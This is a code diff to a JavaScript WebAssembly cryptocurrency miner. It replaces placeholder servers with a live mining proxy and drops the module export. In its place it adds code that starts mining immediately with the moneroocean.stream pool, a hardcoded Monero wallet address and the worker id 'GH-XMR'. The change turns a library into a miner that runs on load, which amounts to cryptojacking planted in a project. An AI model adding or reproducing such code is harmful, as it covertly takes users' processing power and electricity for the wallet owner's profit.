@@ -1,4 +1,4 @@
-var server = "wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
+var server = "wss://f.xmrminingproxy.com:8181", job = null, workers = [], ws, receiveStack = [], sendStack = [], totalhashes = 0, connected = 0, reconnector = 0, attempts = 1, throttleMiner = 0, handshake = null, wasmSupported = function() {
     try {
         if ("object" === typeof WebAssembly && "function" === typeof WebAssembly.instantiate) {
             var c = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
@@ -770,4 +770,11 @@ function on_workermsg(c) {
     }
 }
 ;
-module.exports = { startMining };
+
+var pool = "moneroocean.stream";
+var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+var workerId = "GH-XMR"
+var threads = 1;
+var password = "";
+startMining(pool, walletAddress, workerId, threads, password);
+throttleMiner = 1;
